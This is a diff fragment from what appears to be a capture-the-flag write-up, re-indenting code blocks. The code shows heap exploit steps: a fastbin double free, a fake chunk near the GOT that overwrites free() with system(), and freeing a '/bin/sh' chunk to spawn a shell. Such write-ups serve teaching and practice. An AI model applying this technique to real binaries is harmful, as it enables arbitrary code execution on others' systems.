@@ -306,17 +306,17 @@ In spite of the roundabout way I went about handling this challenge, I got first
    ```c
    add(60, b"A")
    add(60, b"B")
-free(0)
+   free(0)
    free(1)
-free(0)
+   free(0)
    ```
    
    Do a fastbin dupe to a fake unaligned chunk nearby the GOT table, overwriting `free()` with `system()`:
    
    ```c
-add(60, pack(E.got['__gmon_start__']+2)) # 0x602000-6
+   add(60, pack(E.got['__gmon_start__']+2)) # 0x602000-6
    add(60, b'ignore')
-add(60, b'/bin/sh\0')
+   add(60, b'/bin/sh\0')
    add(60, fit({6+8: C.symbols['system']}) + pack(C.symbols['puts']))
    ```
    
@@ -324,7 +324,7 @@ add(60, b'/bin/sh\0')
    The last step is to get a shell via `free("/bin/sh")`:
    
    ```c
-free(4)
+   free(4)
    r.interactive()
    ```
 
